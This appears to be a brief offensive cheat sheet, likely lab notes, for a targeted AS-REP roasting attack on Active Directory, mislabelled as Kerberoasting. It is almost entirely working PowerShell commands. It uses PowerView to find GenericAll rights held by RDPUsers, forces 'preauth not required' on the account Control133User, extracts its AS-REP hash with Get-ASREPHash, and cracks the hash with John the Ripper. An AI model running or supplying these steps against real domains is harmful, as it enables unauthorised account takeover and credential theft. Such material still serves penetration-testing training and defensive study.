# Targeted Kerberoasting - Force set 'Preauth not required'

1. Find active directory rights that have 'GenericAll')
```powershell
#(use powerview_dev)
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```

2. Force set preauth not required
```powershell
#force set preauth not required
Set-DomainObject -Identity Control133User -XOR @{useraccountcontrol=4194304} -Verbose

Get-DomainUser -PreauthNotRequired -Identity Control133User
```

3. Get-ASREPHash from ASREPRoast to request the crackable
```powershell
Get-ASREPHash -UserName Control133User -Verbose

#crack using john
./john hash.txt --wordlist=wordlist.txt
```
